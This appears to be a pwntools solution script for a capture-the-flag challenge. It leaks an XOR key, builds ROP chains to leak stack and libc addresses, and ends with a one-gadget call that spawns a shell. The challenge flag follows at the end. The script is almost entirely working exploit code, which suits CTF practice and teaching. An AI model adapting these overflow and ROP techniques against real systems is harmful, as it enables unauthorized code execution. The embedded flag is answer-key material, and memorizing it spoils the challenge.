from pwn import *

elf = context.binary = ELF("chall")
libc = elf.libc
p = remote("pwn.blitzhack.xyz",9999)


# leak entropy
p.sendlineafter(">","1")
p.send(p8(0) * 32)
p.recvuntil("sult: ")
p.recvline()
entropy = p.recv(32)
print(entropy)

# check the leak
p.sendlineafter(">","1")
p.send(xor(b"Pwned..." , entropy))

p.clean()



pop_rbp = 0x00000000004012dd
ret = 0x000000000040101a


# this will leak the stack 
# rdi points a nulled mem so printf will exit early leaving
# a stack value in rdi
p.sendlineafter(">","2")
p.sendline(xor(cyclic(88) + flat([
    ret,
    elf.plt.printf,
    elf.plt.puts,
    elf.sym.main,
]) ,entropy))

p.recvuntil("...")
p.recvline()
stack_leak = u64(p.recvline().strip().ljust(8,b"\x00"))
print(hex(stack_leak))



# i need more leaks
# jump to the write call in entropy_diagnostic
sleep(1)
p.sendlineafter(">","2")
p.sendline(xor(cyclic(88) + flat([
    ret,
    elf.plt.printf,
    pop_rbp,
    stack_leak + 0x1c0,
    0x0000000000401507, # write call in entropy_diagnostic
    ret,
    ret,
    elf.sym.main,
])  ,entropy))


# get libc leak from the stack
p.recvuntil("...")
p.recvline()
for i in range(29):
    leak = u64(p.recv(8).ljust(8,b"\x00"))

leak = u64(p.recv(8).ljust(8,b"\x00"))
print(hex(leak))
p.clean()

libc.address = leak - 0x2a28b
print("libc",hex(libc.address))


# time to rop
rop = ROP(libc)
p.sendline("2")
p.sendline(xor(cyclic(88) + flat([
    rop.rax.address,0,
    rop.rbx.address,0,
    libc.address + 0x583ec,
])  ,entropy))



p.interactive()

# Blitz{4tt4ck3rs_d0n't_n33d_t0_gu3ss_wh3n_y0u_g1v3_4w4y_y0ur_3ntr0py_1n_d14gn0st1c5_us3rd4t4_4nd_t1m1ng_4r3_3n0ugh}